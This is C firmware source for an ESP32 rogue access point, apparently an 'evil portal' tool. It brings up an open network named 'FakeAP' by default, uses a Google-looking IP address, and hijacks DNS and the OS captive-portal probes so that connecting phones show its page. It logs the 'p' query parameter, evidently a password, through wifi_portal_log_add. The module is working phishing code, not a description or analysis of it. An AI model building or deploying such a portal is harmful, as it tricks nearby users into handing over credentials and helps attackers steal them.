#include "wifi_ap.h"

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "esp_netif_ip_addr.h"
#include "esp_netif_types.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"
#include "wifi_dns.h"
#include "wifi_manager.h"
#include "wifi_portal_log.h"
#include "wifi_portal_iq_logo.h"

static const char *TAG = "wifi_ap";

#define AP_IP_A 172
#define AP_IP_B 217
#define AP_IP_C 28
#define AP_IP_D 1

static httpd_handle_t s_httpd;
static const char *s_html;
static bool s_running;
static char s_ip[16];
static char s_portal_url[32];
static char s_capport_api[40];
static esp_netif_t *s_ap_netif;

static int s_tls_stub_sock = -1;
static TaskHandle_t s_tls_stub_task;
static volatile bool s_tls_stub_run;

static void tls_stub_stop(void);

static void capture_portal_query(httpd_req_t *req)
{
    char query[128];
    if (httpd_req_get_url_query_len(req) + 1 > sizeof(query)) {
        return;
    }
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK) {
        return;
    }
    char val[WIFI_PORTAL_LOG_PW_LEN];
    if (httpd_query_key_value(query, "p", val, sizeof(val)) == ESP_OK) {
        wifi_portal_log_add(val);
    }
}

static void portal_common_headers(httpd_req_t *req)
{
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "-1");
    httpd_resp_set_hdr(req, "Connection", "close");
}

static bool ua_is_apple(httpd_req_t *req)
{
    char ua[160] = {0};
    if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof(ua)) != ESP_OK) {
        return false;
    }
    return strstr(ua, "CaptiveNetworkSupport") != NULL || strstr(ua, "iPhone") != NULL ||
           strstr(ua, "iPad") != NULL || strstr(ua, "iPod") != NULL;
}

static bool req_wants_capport(httpd_req_t *req)
{
    char accept[128] = {0};
    if (httpd_req_get_hdr_value_str(req, "Accept", accept, sizeof(accept)) != ESP_OK) {
        return false;
    }
    return strstr(accept, "capport") != NULL || strstr(accept, "captive+json") != NULL;
}

/** RFC8908 + Android 12 Custom Tabs. */
static esp_err_t capport_api_handler(httpd_req_t *req)
{
    char json[192];
    char ua[96] = {0};
    (void)httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof(ua));
    const char *portal = s_portal_url[0] ? s_portal_url : "http://172.217.28.1/";
    snprintf(json, sizeof(json),
             "{\"captive\":true,\"user-portal-url\":\"%s\",\"x-android-use-custom-tabs\":361335020}",
             portal);
    ESP_LOGI(TAG, "capport JSON ua=%s", ua[0] ? ua : "?");
    httpd_resp_set_type(req, "application/capport+json");
    httpd_resp_set_hdr(req, "Vary", "Accept");
    portal_common_headers(req);
    return httpd_resp_send(req, json, HTTPD_RESP_USE_STRLEN);
}

/** pengz0: probe URLs get 200 + HTML (not 204). */
static esp_err_t portal_handler(httpd_req_t *req)
{
    ESP_LOGI(TAG, "HTTP %s", req->uri);
    httpd_resp_set_type(req, "text/html");
    portal_common_headers(req);
    const char *html = s_html ? s_html : "<html><body>portal</body></html>";
    return httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
}

/** Root: HTML portal OR capport JSON when Accept requests it. */
static esp_err_t root_handler(httpd_req_t *req)
{
    if (req_wants_capport(req)) {
        return capport_api_handler(req);
    }
    capture_portal_query(req);
    return portal_handler(req);
}

/** iOS: 302 redirect. */
static esp_err_t captive_redirect_handler(httpd_req_t *req)
{
    ESP_LOGI(TAG, "HTTP redirect %s", req->uri);
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", s_portal_url[0] ? s_portal_url : "http://172.217.28.1/");
    portal_common_headers(req);
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, "Redirect to captive portal", HTTPD_RESP_USE_STRLEN);
}

/** Android/pengz0: 200 HTML. iOS: 302 redirect. */
static esp_err_t probe_handler(httpd_req_t *req)
{
    if (ua_is_apple(req)) {
        return captive_redirect_handler(req);
    }
    return portal_handler(req);
}

static esp_err_t iq_logo_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "image/svg+xml");
    portal_common_headers(req);
    return httpd_resp_send(req, WIFI_PORTAL_IQ_LOGO_SVG, WIFI_PORTAL_IQ_LOGO_SVG_LEN);
}

static esp_err_t http_404_handler(httpd_req_t *req, httpd_err_code_t err)
{
    (void)err;
    if (req_wants_capport(req)) {
        return capport_api_handler(req);
    }
    if (ua_is_apple(req)) {
        ESP_LOGI(TAG, "HTTP 404 -> / (%s)", req->uri);
        httpd_resp_set_status(req, "303 See Other");
        httpd_resp_set_hdr(req, "Location", "/");
        portal_common_headers(req);
        httpd_resp_set_type(req, "text/html");
        return httpd_resp_send(req, "Redirect to captive portal", HTTPD_RESP_USE_STRLEN);
    }
    return portal_handler(req);
}

static esp_err_t http_405_handler(httpd_req_t *req, httpd_err_code_t err)
{
    (void)err;
    return portal_handler(req);
}

static void register_uri(httpd_handle_t hd, const char *uri, httpd_method_t method,
                         esp_err_t (*handler)(httpd_req_t *))
{
    httpd_uri_t u = {
        .uri = uri,
        .method = method,
        .handler = handler,
        .user_ctx = NULL,
    };
    httpd_register_uri_handler(hd, &u);
}

static void register_probe(httpd_handle_t hd, const char *uri)
{
    register_uri(hd, uri, HTTP_GET, probe_handler);
}

static esp_err_t set_dhcp_captive_portal_uri(void)
{
    snprintf(s_portal_url, sizeof(s_portal_url), "http://%s/", s_ip);
    snprintf(s_capport_api, sizeof(s_capport_api), "http://%s/capport", s_ip);
    esp_err_t err = esp_netif_dhcps_stop(s_ap_netif);
    if (err != ESP_OK && err != ESP_ERR_ESP_NETIF_DHCP_ALREADY_STOPPED) {
        ESP_LOGW(TAG, "dhcps_stop %s", esp_err_to_name(err));
    }

    uint8_t offer_dns = 1;
    err = esp_netif_dhcps_option(s_ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
                                 &offer_dns, sizeof(offer_dns));
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "offer DNS %s", esp_err_to_name(err));
    }

    /* Android 12 fetches this URL directly — must always return JSON, not HTML. */
    err = esp_netif_dhcps_option(s_ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI,
                                 s_capport_api, strlen(s_capport_api));
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "captive URI opt %s", esp_err_to_name(err));
        (void)esp_netif_dhcps_start(s_ap_netif);
        return err;
    }
    err = esp_netif_dhcps_start(s_ap_netif);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "dhcps_start %s", esp_err_to_name(err));
    }
    ESP_LOGI(TAG, "DHCP capport API: %s portal: %s", s_capport_api, s_portal_url);
    return ESP_OK;
}

static void tls_stub_task(void *arg)
{
    (void)arg;
    while (s_tls_stub_run) {
        struct sockaddr_in client;
        socklen_t clen = sizeof(client);
        int cs = accept(s_tls_stub_sock, (struct sockaddr *)&client, &clen);
        if (cs < 0) {
            if (!s_tls_stub_run) {
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(10));
            continue;
        }
        close(cs);
    }
    s_tls_stub_task = NULL;
    vTaskDelete(NULL);
}

static esp_err_t tls_stub_start(void)
{
    tls_stub_stop();
    s_tls_stub_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (s_tls_stub_sock < 0) {
        ESP_LOGW(TAG, "tls stub socket");
        return ESP_FAIL;
    }

    int yes = 1;
    setsockopt(s_tls_stub_sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(s_tls_stub_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGW(TAG, "tls stub bind :443 errno=%d", errno);
        close(s_tls_stub_sock);
        s_tls_stub_sock = -1;
        return ESP_FAIL;
    }
    if (listen(s_tls_stub_sock, 4) < 0) {
        close(s_tls_stub_sock);
        s_tls_stub_sock = -1;
        return ESP_FAIL;
    }

    int flags = fcntl(s_tls_stub_sock, F_GETFL, 0);
    fcntl(s_tls_stub_sock, F_SETFL, flags | O_NONBLOCK);

    s_tls_stub_run = true;
    if (xTaskCreatePinnedToCore(tls_stub_task, "tls_stub", 2048, NULL, 4, &s_tls_stub_task, 1) != pdPASS) {
        s_tls_stub_run = false;
        close(s_tls_stub_sock);
        s_tls_stub_sock = -1;
        return ESP_FAIL;
    }
    ESP_LOGI(TAG, "TLS stub listening :443");
    return ESP_OK;
}

static void tls_stub_stop(void)
{
    s_tls_stub_run = false;
    if (s_tls_stub_sock >= 0) {
        shutdown(s_tls_stub_sock, SHUT_RDWR);
        close(s_tls_stub_sock);
        s_tls_stub_sock = -1;
    }
    for (int i = 0; i < 50 && s_tls_stub_task; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

static esp_err_t start_httpd(void)
{
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.max_open_sockets = 4;
    cfg.max_uri_handlers = 20;
    cfg.lru_purge_enable = true;
    cfg.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&s_httpd, &cfg) != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start");
        return ESP_FAIL;
    }

    register_uri(s_httpd, "/", HTTP_GET, root_handler);
    register_uri(s_httpd, "/capport", HTTP_GET, capport_api_handler);
    register_uri(s_httpd, "/iq.svg", HTTP_GET, iq_logo_handler);
    register_probe(s_httpd, "/generate_204");
    register_probe(s_httpd, "/gen_204");
    register_probe(s_httpd, "/generate204");
    register_probe(s_httpd, "/hotspot-detect.html");
    register_probe(s_httpd, "/library/test/success.html");
    register_probe(s_httpd, "/success.txt");
    register_probe(s_httpd, "/connecttest.txt");
    register_probe(s_httpd, "/ncsi.txt");
    register_probe(s_httpd, "/fwlink");
    register_probe(s_httpd, "/redirect");
    register_probe(s_httpd, "/mobile/status.php");
    register_probe(s_httpd, "/check_network_status.txt");
    register_uri(s_httpd, "/*", HTTP_GET, portal_handler);

    httpd_register_err_handler(s_httpd, HTTPD_404_NOT_FOUND, http_404_handler);
    httpd_register_err_handler(s_httpd, HTTPD_405_METHOD_NOT_ALLOWED, http_405_handler);
    return ESP_OK;
}

esp_err_t wifi_ap_start(const char *ssid, const char *html)
{
    if (s_running) {
        s_html = html;
        return ESP_OK;
    }

    s_html = html;
    if (!s_ap_netif) {
        s_ap_netif = esp_netif_create_default_wifi_ap();
    }

    wifi_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    strncpy((char *)cfg.ap.ssid, ssid && ssid[0] ? ssid : "FakeAP", sizeof(cfg.ap.ssid) - 1);
    cfg.ap.ssid_len = (uint8_t)strlen((char *)cfg.ap.ssid);
    cfg.ap.channel = 1;
    cfg.ap.max_connection = 4;
    cfg.ap.authmode = WIFI_AUTH_OPEN;
    cfg.ap.ssid_hidden = 0;

    esp_netif_ip_info_t ipinfo;
    memset(&ipinfo, 0, sizeof(ipinfo));
    esp_netif_set_ip4_addr(&ipinfo.ip, AP_IP_A, AP_IP_B, AP_IP_C, AP_IP_D);
    esp_netif_set_ip4_addr(&ipinfo.gw, AP_IP_A, AP_IP_B, AP_IP_C, AP_IP_D);
    esp_netif_set_ip4_addr(&ipinfo.netmask, 255, 255, 255, 0);
    (void)esp_netif_dhcps_stop(s_ap_netif);

    esp_err_t err = esp_netif_set_ip_info(s_ap_netif, &ipinfo);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_ip_info %s", esp_err_to_name(err));
        return err;
    }

    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        return err;
    }
    err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
    if (err != ESP_OK) {
        return err;
    }
    err = esp_wifi_start();
    if (err != ESP_OK && err != ESP_ERR_WIFI_CONN) {
        return err;
    }
    wifi_manager_apply_power_limits();
    vTaskDelay(pdMS_TO_TICKS(500));

    (void)esp_netif_dhcps_stop(s_ap_netif);
    err = esp_netif_set_ip_info(s_ap_netif, &ipinfo);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_ip_info %s", esp_err_to_name(err));
        (void)esp_wifi_stop();
        return err;
    }
    err = esp_netif_dhcps_start(s_ap_netif);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "dhcps_start %s", esp_err_to_name(err));
        (void)esp_wifi_stop();
        return err;
    }

    snprintf(s_ip, sizeof(s_ip), "%d.%d.%d.%d", AP_IP_A, AP_IP_B, AP_IP_C, AP_IP_D);

    err = start_httpd();
    if (err != ESP_OK) {
        (void)esp_wifi_stop();
        return err;
    }
    (void)tls_stub_start();

    (void)set_dhcp_captive_portal_uri();

    err = wifi_dns_start(AP_IP_A, AP_IP_B, AP_IP_C, AP_IP_D);
    if (err != ESP_OK) {
        tls_stub_stop();
        if (s_httpd) {
            httpd_stop(s_httpd);
            s_httpd = NULL;
        }
        (void)esp_wifi_stop();
        return err;
    }

    s_running = true;
    ESP_LOGI(TAG, "AP '%s' ip=%s", cfg.ap.ssid, s_ip);
    return ESP_OK;
}

void wifi_ap_stop(void)
{
    if (!s_running) {
        return;
    }
    if (s_httpd) {
        httpd_stop(s_httpd);
        s_httpd = NULL;
    }
    tls_stub_stop();
    wifi_dns_stop();
    (void)esp_wifi_stop();
    s_running = false;
    ESP_LOGI(TAG, "AP stopped");
}

void wifi_ap_poll(void)
{
}

bool wifi_ap_is_running(void)
{
    return s_running;
}

const char *wifi_ap_ip_str(void)
{
    return s_running ? s_ip : "—";
}
